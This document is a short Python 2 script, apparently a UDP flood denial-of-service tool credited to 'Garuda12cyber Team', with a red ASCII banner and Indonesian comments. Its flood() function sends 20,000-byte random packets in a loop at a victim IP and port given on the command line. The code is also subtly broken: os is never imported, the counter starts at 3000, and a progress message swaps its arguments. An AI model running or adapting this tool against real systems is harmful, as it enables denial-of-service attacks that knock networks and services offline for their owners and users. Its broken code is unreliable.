import time
import socket
import random
import sys
def usage():
         os.system("clear")

print("""

\033[1;31m                      ..-------.`                      
\033[1;31m                `--::-..........-:::--`                
\033[1;31m             .-:-.`     ````````    `.-:-.             
\033[1;31m           -:-`      ````````````       .-:-           
\033[1;31m         -/.      ````           ````      -/.         
\033[1;31m       `/-     `.`      `` ```       `.      :/`       
\033[1;31m      `+.     ..         -.--         `.`     .+`      
\033[1;31m     `o`     .`   `     `:.+.      `    ..     `+      
\033[1;31m     +.     .`   `````  `///`      ``    .`     -/     
\033[1;31m     o./`:/`-    ````````./o-```` ```     - -:`-/o     
\033[1;31m    -: +`+/.`    ````...//+o//:.`````     -  +`/:+.    
\033[1;31m    :-   ``.`     ```.`-o////+/-`````     -  ` ``/-    
\033[1;31m    ./     `.      ``-`.+/+m+o:-.``       -      +`    
\033[1;31m     o      -       `-`.://ss+---`       `.      o     
\033[1;31m     ::     `.     ````...-:---..``     `-      /-     
\033[1;31m      /-     `.     `.```./--..--`     `.      :/      
\033[1;37m       /:     `.`   `````.:...```     ..      ::       
\033[1;37m        -/.     ````````  ``````    ```     ./-        
\033[1;37m```````` `::.      `````     ```````      .::`         
\033[1;37m           `-:-`       `````````       `-:-````````````
\033[1;37m.`            .-:.```   ````````  ```::-.             `
\033[1;37m ..`              `.--:::::-:::::--.`              `.``
\033[1;37m   ..`                                          `..`   
\033[1;37m     ..```````````````````````````````````````..`      

""")

os.system("figlet Danger DDos Attack")
os.system("figlet By")
os.system("figlet Garuda12cyber Team")


print("""

\033[1;31m Author   : Garuda12cyber
\033[1;31m Gmail    : garuda12cyber@gmail.com
\033[1;37m github   : https://github.com/Garuda12cyber

""")



def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
